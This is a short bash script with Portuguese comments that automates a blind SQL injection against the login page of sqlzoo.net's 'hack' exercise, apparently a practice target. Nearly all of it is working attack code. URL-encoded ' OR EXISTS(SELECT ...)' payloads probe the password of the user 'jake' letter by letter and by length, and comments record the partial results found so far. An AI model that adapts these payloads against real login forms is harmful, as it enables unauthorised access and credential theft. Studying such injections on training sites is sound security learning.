#!/bin/bash
# Site http://sqlzoo.net/hack/
#echo curl http://sqlzoo.net/hack/passwd.pl?name=xxx\&password=' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '$1') AND ''='

#set -x


function contemLetra {
#SELECT name from users WHERE name='xxx' AND password='' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password LIKE '%w%') AND ''='
	curl "http://sqlzoo.net/hack/passwd.pl?name=xxx&password=%27+OR+EXISTS%28SELECT+*+FROM+users+WHERE+name%3D%27jake%27+AND+password+LIKE+%27%25$1%25%27%29+AND+%27%27%3D%27"
}

function tamanho {
	curl "http://sqlzoo.net/hack/passwd.pl?name=xxx&password=%27+OR+EXISTS%28SELECT+*+FROM+users+WHERE+name%3D%27jake%27+AND+LEN%28password%29%3D$1+AND+%27%27%3D%27"
}

# Letras Encontradas: d e l o w
function buscaLetras {
	echo "Iniciando Busca Letras"
	echo ""
	for i in {a..z}
	do
	  echo "Letra " $i ":"
	  contemLetra $i
	  echo ""
	done
	echo
	echo "Fim Busca Letras"

	echo "Iniciando Busca Numeros"
	echo ""
	for i in {0..9}
	do
	  echo "Letra " $i ":"
	  contemLetra $i
	  echo ""
	done
	echo
	echo "Fim Busca Numeros"


}




# Tamanho encontrado: 6
function curlComTamanho {
	#set -x
	echo "Curl com $1"
	curl "http://sqlzoo.net/hack/passwd.pl?name=xxx&password=%27+OR+EXISTS%28SELECT+*+FROM+users+WHERE+name%3D%27jake%27+AND+password+LIKE+%27$1%27%29+AND+%27%27%3D%27"

}

buscaLetras
echo "Fim teste"

